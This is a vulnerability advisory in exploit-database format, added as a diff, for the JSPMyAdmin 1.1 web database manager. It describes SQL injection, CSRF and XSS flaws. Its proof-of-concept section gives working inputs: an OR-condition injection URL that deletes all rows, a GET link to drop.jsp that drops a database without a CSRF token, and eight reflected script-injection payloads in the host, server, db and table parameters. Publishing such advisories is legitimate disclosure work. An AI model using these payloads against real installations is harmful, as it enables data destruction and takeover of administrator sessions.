@@ -1,0 +1,157 @@
+# Exploit Title: JSPMyAdmin 1.1 SQL Injection, CSRF & XSS
+# Google Dork: intitle:SQL Injection
+# Date: 2015-05-29
+# Exploit Author:  John Page (hyp3rlinx)
+# Website: hyp3rlinx.altervista.org/
+# Vendor Homepage: https://code.google.com/p/jsp-myadmin/
+# Software Link: https://code.google.com/p/jsp-myadmin/
+# Version: 1.1
+# Tested on: windows 7
+# Category: webapps
+
+Source:
+http://hyp3rlinx.altervista.org/advisories/AS-JSPMYADMIN0529.txt
+
+
+Product:
+JSPAdmin 1.1 is a Java web based MySQL database management system.
+
+
+Advisory Information:
+================================================
+JSPMyAdmin 1.1 SQL Injection, CSRF & XSS Vulnerabilities
+
+
+SQL Injection
+CSRF
+XSS
+
+
+
+Vulnerability Details:
+=====================
+
+SQL Injection:
+deletedata.jsp is supposed to delete 1 field per query, yet we can control
+the SQL and build an OR condition.
+Problem is application uses concatenated user input to build SQL statements
+even though paramaterized queries are used.
+
+In deletedata.jsp we find the following code:
+
+con.prepareStatement("DELETE FROM " + table + " WHERE "+ field + "='" + val
++"'");
+
+So expected SQL to be run is this deleting 1 record.
+
+e.g.
+http://localhost:8081/JSPMyAdmin/deletedata.jsp?db=test&table=email&field=CATID&val=7
+
+But the SQL Injection vulnerability lets us instead drop all fields using
+an SQL 'OR' statement.
+
+e.g.
+http://localhost:8081/JSPMyAdmin/deletedata.jsp?db=test&table=email&field=CATID
+or 'field'='NAME'
+
+*************************************************************************************************
+
+
+CSRF:
+We can drop any database by sending victim malicious linx as there is no
+CSRF token used.
+*****************************************************************************************
+
+
+XSS:
+
+There is zero user input checks allowing remote attackers to execute
+arbitrary scripts in the
+context of an authenticated user's browser session.
+***************************************************
+
+
+
+Exploit code(s):
+===============
+
+SQL Injection POC:
+------------------
+
+So expected SQL to be run is this deleting 1 record
+http://localhost:8081/JSPMyAdmin/deletedata.jsp?db=test&table=email&field=CATID&val=7
+http://localhost:8081/JSPMyAdmin/deletedata.jsp?db=test&table=email&field=CATID
+or 'field'='NAME'
+
+
+CSRF POC:
+---------
+http://127.0.0.1:8081/JSPMyAdmin/drop.jsp?db=mydb
+
+
+
+XSS(s) POC:
+----------
+
+1- </title><script>alert('XSS By hyp3rlinx');</script><title>
+   Using POST method in 'host' parameter of login page.
+   http://127.0.0.1:8081/JSPMyAdmin/
+
+2- http://127.0.0.1:8081/JSPMyAdmin/right.jsp?server=localhost&db=
+"/><script>alert(666)</script>
+
+3- http://127.0.0.1:8081/JSPMyAdmin/right.jsp?server=
+"/><script>alert(666)</script>&db=
+
+4- http://127.0.0.1:8081/JSPMyAdmin/tabledata.jsp?db=
+"/><script>alert(666);</script>
+
+5-
+http://127.0.0.1:8081/JSPMyAdmin/tabledata.jsp?server=localhost&db=mysql&table=
+"/><script>alert(666);</script>
+
+6- http://127.0.0.1:8081/JSPMyAdmin/tabledata.jsp?server=
+"/><script>alert(666);</script>&db=
+
+7- http://127.0.0.1:8081/JSPMyAdmin/query.jsp?server=
+"/><script>alert(666)</script>&db=
+
+8- http://127.0.0.1:8081/JSPMyAdmin/export.jsp?db=test&table=
+<script>alert(666)</script>
+
+
+
+
+Disclosure Timeline:
+=========================================================
+
+
+Vendor Notification:  NA
+May 29, 2015: Public Disclosure
+
+
+
+Severity Level:
+=========================================================
+High
+
+
+
+Description:
+==========================================================
+
+Request Method(s):
+                                [+] GET / POST
+
+Vulnerable Product:
+                                [+] JSPMyAdmin 1.1
+
+Vulnerable Parameter(s):
+                                [+] host, server, db, table
+
+Affected Area(s):
+                                [+] Entire admin
+
+===============================================================
+
+(hyp3rlinx)
